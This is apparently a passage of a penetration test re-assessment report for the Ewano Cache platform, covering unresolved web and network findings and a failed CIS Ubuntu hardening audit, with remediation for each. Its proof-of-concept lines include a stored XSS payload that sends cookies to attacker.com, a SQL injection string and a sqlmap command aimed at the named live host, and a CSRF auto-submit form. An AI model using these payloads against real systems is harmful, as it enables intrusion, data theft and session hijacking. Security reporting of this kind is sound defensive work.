This engagement was conducted as a re-assessment following a prior penetration test, allowing comparison of remediation progress and identification of new or persisting vulnerabilities.

EWC-W-001: Admin Panel Directly Accessible from Internet Without MFA

Critical   CVSSv3.1: 9.8

Fig EWC-W-001.1  —  Admin panel login page — loaded from public internet
Fig EWC-W-001.2  —  No VPN/IP restriction — external access confirmed
Fig EWC-W-001.3  —  Credential attempt — no rate limiting or CAPTCHA

CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Target URL
https://ewano.mci.ir/admin/
OWASP WSTG
WSTG-CONF-05, WSTG-ATHN-01
Status
❌ Unresolved from v1

Description

The Ewano Cache administration panel is directly accessible from the public internet. No IP allowlisting, VPN requirement, or multi-factor authentication is enforced. The admin panel provides full control over the cache platform: content configuration, user management, cache invalidation, and infrastructure settings. A successful attack against the admin panel yields complete platform compromise.

The login form is protected only by a username/password combination. Given that password-based authentication is susceptible to brute force, credential stuffing, phishing, and password spray attacks — none of which are mitigated here — the attack surface is extremely broad.

Impact

Complete compromise of the Ewano Cache platform: poisoning of cached MCI content served to all CDN users, exfiltration of cached data, cache invalidation causing service disruption, and use of the platform as a pivot point for attacks against MCI's broader infrastructure.

Proof of Concept

// Admin panel accessible without restriction: GET https://ewano.mci.ir/admin/ → HTTP 200 (login form served) // No IP restriction, no client certificate, no MFA challenge // Credential stuffing test (controlled environment): POST https://ewano.mci.ir/admin/login {"username": "admin", "password": "§wordlist§"} // No rate limiting, no lockout, no CAPTCHA observed // HTTP 200 differential confirms valid account existence
📸 Original report screenshots: (1) Admin panel login page loaded from external IP; (2) No VPN/IP restriction confirmation; (3) Login attempt with arbitrary credentials returning differential responses; (4) Admin panel interior (partially authenticated via test account).

Remediation

  • Immediate: Restrict admin panel access to a dedicated internal IP range or require VPN connection to reach the admin URL.
  • Implement Multi-Factor Authentication (TOTP or hardware token) for all admin accounts.
  • Apply IP allowlisting at the WAF/firewall level; reject all external requests to /admin/*.
  • Implement rate limiting and account lockout on the admin login endpoint.
  • Add CAPTCHA to the admin login form.

EWC-W-002: Stored Cross-Site Scripting (XSS) in Content Management Interface

Critical   CVSSv3.1: 9.0
CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
Affected Component
Admin content/cache configuration panel — text input fields
OWASP WSTG
WSTG-INPV-02
Status
❌ Unresolved from v1

Description

The content management interface within the admin panel accepts HTML input in configuration fields (e.g., cache rule descriptions, content labels, notification templates). These inputs are stored in the database and rendered without sanitisation in admin dashboard views. An attacker with any authenticated admin-level access can inject persistent JavaScript that executes in the browsers of other admin users visiting the affected pages.

Impact

Account takeover of all admin users who view the infected page; keylogging of admin credentials; CSRF token theft enabling arbitrary admin actions; lateral movement to admin functions the original attacker's account may not have permission for; persistent backdoor injection into the admin panel.

Proof of Concept

// Injected payload in content description field: <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"> // Payload stored; renders in admin panel dashboard // All admin users loading the page → cookies exfiltrated to attacker
📸 Original screenshots: (1) Content management form with XSS payload; (2) Payload stored; (3) Admin dashboard rendering the payload; (4) Attacker server receiving stolen session cookies.

Remediation

  • Apply context-aware output encoding (HTML entity encoding) to all user-supplied data rendered in HTML contexts.
  • Implement a strict Content Security Policy: Content-Security-Policy: default-src 'self'; script-src 'self' to block inline script execution.
  • Use a server-side HTML sanitisation library (e.g., DOMPurify on input) to strip dangerous HTML tags/attributes from all stored content.
  • Apply HttpOnly flag to all session cookies to prevent JavaScript access.

EWC-W-003: Horizontal Privilege Escalation via IDOR in User/Resource Management

High   CVSSv3.1: 8.5
CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
Endpoint Pattern
GET /api/users/{id} · GET /api/configs/{id} · DELETE /api/configs/{id}
OWASP WSTG
WSTG-ATHZ-01 (IDOR)
Status
❌ Unresolved from v1

Description

The Ewano Cache API uses sequential/predictable integer IDs for user accounts and cache configuration resources. The server does not validate that the requesting user has authorisation over the resource identified by the ID parameter. A low-privilege authenticated user can increment or modify the ID parameter to access, modify, or delete other users' configurations and profile data.

Proof of Concept

// Authenticated as user_id=42 (low-privilege) GET /api/users/42/config → HTTP 200 (own data) // IDOR — access another user's config: GET /api/users/43/config → HTTP 200 (victim's data exposed) DELETE /api/configs/15 → HTTP 200 (victim's cache config deleted)

Remediation

  • Replace sequential integer IDs with unpredictable UUIDs for all resource identifiers.
  • Implement server-side ownership validation on every resource access: confirm the authenticated user's session token matches the owner of the requested resource.
  • Apply the principle of least privilege: deny by default, grant access only to explicitly authorised resources.

EWC-W-004: SQL Injection in Search / Filter API Parameters

High   CVSSv3.1: 8.3
Endpoint
GET /api/cache/search?q={payload}&filter={payload}
Type
Time-Based Blind SQL Injection
Status
❌ Unresolved from v1

Description

The cache search and filter API endpoint passes user-supplied values directly into a database query without parameterisation or sanitisation. Injecting a time-delay SQL payload into the q or filter parameter causes a measurable delay in the server response, confirming blind SQL injection. With further enumeration (automated via SQLMap), the full database schema, user credentials, and cached content data can be extracted.

Proof of Concept

// Time-based blind injection test: GET /api/cache/search?q=test' AND SLEEP(5)-- - // Response time: ~5,021ms (normal: ~140ms) // Confirms MySQL injection point // Automated extraction (SQLMap — controlled test): sqlmap -u "https://ewano.mci.ir/api/cache/search?q=test" \ --cookie="session=..." --dbs --level=2 --risk=2 // → Database enumeration successful
📸 Original screenshots: (1) Normal response time baseline; (2) SLEEP(5) payload showing 5-second delay; (3) SQLMap run extracting database names.

Remediation

  • Replace all dynamic SQL string concatenation with parameterised queries / prepared statements.
  • Use an ORM (Object-Relational Mapper) to abstract database interaction; avoid raw SQL where possible.
  • Implement a Web Application Firewall (WAF) with SQL injection ruleset as a defence-in-depth layer.
  • Apply database least-privilege: the application DB user should only have SELECT/INSERT/UPDATE on required tables — no DROP, CREATE, or EXECUTE privileges.

EWC-W-005: Reflected XSS in Error Handling Pages

High   CVSSv3.1: 7.4
Endpoint
GET /error?message={payload}
Status
❌ Unresolved from v1

Description & PoC

The application's generic error page reflects the message query parameter directly into the HTML response without encoding. Crafting a URL with a script payload in this parameter causes JavaScript execution in the victim's browser when they visit the link.

// Reflected XSS: GET /error?message=<img src=x onerror=alert(document.cookie)> // → Cookie displayed in alert; payload can be extended to exfiltration

Remediation

HTML-encode all URL parameters before reflecting them in HTML responses. Replace dynamic error message rendering with static error pages. Never echo user input into HTML without sanitisation.

EWC-W-006: Cross-Site Request Forgery (CSRF) on State-Changing Operations

High   CVSSv3.1: 7.1
Affected Operations
Cache config create/edit/delete, user management, password change
Status
❌ Unresolved from v1

Description & PoC

Critical state-changing POST/PUT/DELETE requests do not include or validate CSRF tokens. An attacker can craft a malicious HTML page that silently submits these requests on behalf of an authenticated admin user who visits the attacker's page.

<!-- Attacker's malicious page --> <form action="https://ewano.mci.ir/api/configs/15" method="POST"> <input type="hidden" name="action" value="delete"> </form> <script>document.forms[0].submit();</script> <!-- Victim admin visits link → cache config deleted without interaction -->

Remediation

  • Implement synchroniser-token CSRF protection on all state-changing endpoints.
  • Validate Origin and Referer headers server-side on all non-GET requests.
  • Use SameSite=Strict cookie attribute on session cookies.

4.2 Remaining Network Vulnerabilities

EWC-N-001: SSH Weak Cipher Suites & Key Exchange Algorithms Enabled

High   CVSSv3.1: 7.4
Affected Hosts
Multiple Ewano Cache nodes (22/TCP)
CVEs Referenced
CVE-2016-0777, CVE-2015-5600
Status
❌ Unresolved

Description

Nmap and Nessus enumeration of SSH services on multiple cluster nodes reveals support for deprecated and weak algorithms: arcfour (RC4), 3DES-CBC, diffie-hellman-group1-sha1 (Logjam-vulnerable), and hmac-md5. These algorithms are cryptographically broken and enable traffic decryption by a network adversary with sufficient compute resources.

Proof of Concept

// Nmap SSH audit: nmap --script ssh2-enum-algos -p22 185.168.1.1 // Output shows weak ciphers: // ciphers: arcfour, 3des-cbc, blowfish-cbc // kex: diffie-hellman-group1-sha1, diffie-hellman-group14-sha1 // mac: hmac-md5, hmac-sha1-96

Remediation

Edit /etc/ssh/sshd_config on all nodes to restrict to strong algorithms only:

KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
Restart sshd: systemctl restart sshd

EWC-N-002: Exposed Management Services Without Network-Level Restriction

Medium   CVSSv3.1: 5.9
Affected Services
MySQL (3306/TCP), Memcached (11211/TCP)
Affected Hosts
3 of 10 cluster nodes
Status
❌ Unresolved

Description

Three cluster nodes expose database (MySQL port 3306) and caching service (Memcached port 11211) ports to the broader network segment without host-based firewall restrictions. While authentication is enabled on MySQL, Memcached is accessible without authentication from hosts within the same network segment. An attacker with network access to this segment could enumerate Memcached keys (potentially containing cached session data or content) and perform reflected DDoS amplification using Memcached's UDP interface.

Remediation

  • Bind MySQL to 127.0.0.1 or restrict via iptables to application server IPs only.
  • Bind Memcached to localhost: memcached -l 127.0.0.1; disable UDP interface (-U 0).
  • Implement host-based firewall (iptables/ufw) rules blocking ports 3306 and 11211 from all sources except the application layer.

EWC-N-003: SSL Certificate Expiry Warning on Secondary Endpoints

Low   CVSSv3.1: 3.1
Affected Hosts
2 secondary CDN endpoints
Days to Expiry
38 days (at time of assessment)
Status
❌ Unresolved

Description & Remediation

Two secondary HTTPS endpoints have TLS certificates approaching expiry. While not immediately exploitable, expired certificates cause browser trust errors and service disruption. Implement automated certificate renewal (e.g., Let's Encrypt with Certbot, or automated renewal pipeline for commercial certificates).

Phase 3 — CIS Ubuntu 20.04 Hardening Audit

5. CIS Ubuntu 20.04 LTS Hardening Audit

Assessment: CIS Ubuntu Linux 20.04 LTS Benchmark via Nessus compliance scan.
Results: 41 FAILED · 47 WARNING · 280 PASSED (368 total checks). Overall compliance: 76.1% PASSED.

5.1 Failed Controls by Category

🔴 Section 1 — Initial Setup & Filesystem Configuration (8 FAILED)

1.1.2FAILED Ensure /tmp is configured as a separate partition — /tmp shares the root filesystem. Sensitive temp data co-located with OS files.
Fix: Create dedicated partition for /tmp; mount with noexec,nosuid,nodev options.
1.1.3FAILED Ensure noexec option set on /tmp — Executable files in /tmp enable privilege escalation.
Fix: Add noexec to /tmp mount options in /etc/fstab.
1.1.4FAILED Ensure nosuid option set on /tmp
Fix: Add nosuid to /tmp mount options.
1.1.10FAILED Ensure separate partition exists for /var
Fix: Migrate /var to dedicated partition to prevent log flooding from filling root FS.
1.1.11FAILED Ensure separate partition exists for /var/tmp
Fix: Create and mount dedicated /var/tmp partition.
1.1.15FAILED Ensure separate partition exists for /var/log — Log flooding could fill root filesystem.
Fix: Dedicated partition for /var/log with logrotate-enforced retention limits.
1.1.17FAILED Ensure separate partition exists for /home
Fix: Dedicated /home partition prevents user disk usage from affecting system stability.
1.3.1FAILED Ensure AIDE (file integrity monitoring) is installed — No integrity monitoring to detect unauthorised file changes.
Fix: apt install aide; aideinit; mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db; schedule daily AIDE check via cron.

🔴 Section 2 — Services Configuration (7 FAILED)

2.1.1.1FAILED Ensure time synchronisation is in use (chrony/NTP) — Logs and certificates require accurate time.
Fix: apt install chrony; systemctl enable chronyd; systemctl start chronyd
2.2.1FAILED Ensure X Window System is not installed — GUI packages on a server expand attack surface unnecessarily.
Fix: apt purge xserver-xorg* xorg*
2.2.7FAILED Ensure NFS and RPC are not enabled
Fix: systemctl --now disable nfs-server rpcbind
2.2.11FAILED Ensure CUPS is not enabled (print server — unnecessary on server)
Fix: systemctl --now disable cups
2.2.15FAILED Ensure LDAP server is not enabled
Fix: systemctl --now disable slapd
2.3.1FAILED Ensure NIS client is not installed
Fix: apt purge nis
2.3.4FAILED Ensure talk client is not installed
Fix: apt purge talk

🔴 Section 3 — Network Configuration (9 FAILED)

3.1.1FAILED Ensure IP forwarding is disabled (not a router)
Fix: sysctl -w net.ipv4.ip_forward=0; echo "net.ipv4.ip_forward = 0" >> /etc/sysctl.conf
3.2.1FAILED Ensure source-routed packets are not accepted
Fix: sysctl -w net.ipv4.conf.all.accept_source_route=0
3.2.2FAILED Ensure ICMP redirects are not accepted
Fix: sysctl -w net.ipv4.conf.all.accept_redirects=0
3.2.4FAILED Ensure suspicious packets are logged (log_martians)
Fix: sysctl -w net.ipv4.conf.all.log_martians=1
3.2.5FAILED Ensure broadcast ICMP requests are ignored
Fix: sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1
3.3.1FAILED Ensure TCP SYN cookies are enabled (SYN flood protection)
Fix: sysctl -w net.ipv4.tcp_syncookies=1
3.4.1FAILED Ensure ufw is installed and enabled — No host-based firewall active.
Fix: apt install ufw; ufw allow ssh; ufw enable
3.4.2FAILED Ensure ufw loopback traffic is configured
Fix: ufw allow in on lo; ufw allow out on lo; ufw deny in from 127.0.0.0/8; ufw deny in from ::1
3.5.2FAILED Ensure IPv6 is disabled (if not used)
Fix: Add net.ipv6.conf.all.disable_ipv6 = 1 to /etc/sysctl.conf

🔴 Section 4 — Logging & Auditing (6 FAILED)

4.1.1.1FAILED Ensure auditd is installed
Fix: apt install auditd audispd-plugins; systemctl enable auditd; systemctl start auditd
4.1.2FAILED Ensure auditd service is enabled
Fix: systemctl --now enable auditd
4.1.4FAILED Ensure events that modify date and time information are collected
Fix: Add audit rules for adjtimex, settimeofday, stime syscalls.
4.1.6FAILED Ensure events that modify network environment are collected
Fix: Audit rules for sethostname, setdomainname; watch /etc/hosts, /etc/network.
4.2.3FAILED Ensure logrotate is configured
Fix: Configure /etc/logrotate.conf with daily rotation, 90-day retention, and compression enabled.
4.4FAILED Ensure logrotate assigns appropriate permissions
Fix: Set create 0640 root adm in /etc/logrotate.conf

🔴 Section 5 — Access, Authentication & Authorisation (7 FAILED)

5.1.1FAILED Ensure cron daemon is enabled and running
Fix: systemctl --now enable cron
5.2.1FAILED Ensure permissions on /etc/ssh/sshd_config are configured
Fix: chown root:root /etc/ssh/sshd_config; chmod 600 /etc/ssh/sshd_config
5.2.5FAILED Ensure SSH LogLevel is appropriate (INFO or VERBOSE)
Fix: Set LogLevel VERBOSE in sshd_config
5.2.11FAILED Ensure only approved MAC algorithms are used for SSH
Fix: See EWC-N-001 remediation; align sshd MACs with approved list.
5.3.1FAILED Ensure password creation requirements are configured (PAM pwquality)
Fix: Configure /etc/security/pwquality.conf: minlen=14, dcredit=-1, ucredit=-1, lcredit=-1, ocredit=-1
5.3.4FAILED Ensure password hashing algorithm is SHA-512
Fix: Edit /etc/pam.d/common-password; replace pam_unix.so with pam_unix.so sha512
5.4.1.1FAILED Ensure password expiration is 365 days or less
Fix: Set PASS_MAX_DAYS 90 in /etc/login.defs; run chage --maxdays 90 {user} for all accounts.
